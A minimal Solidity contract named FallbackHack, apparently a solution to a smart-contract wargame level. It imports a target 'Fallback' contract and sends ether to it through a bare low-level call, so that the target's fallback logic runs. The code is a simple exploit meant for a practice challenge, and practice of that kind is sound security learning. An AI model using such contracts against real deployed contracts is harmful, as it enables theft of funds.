// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import './Fallback.sol';

contract FallbackHack {
  
  function hack(address fallbackAddress) public payable {
    payable(fallbackAddress).call{value:msg.value}("");
  }
}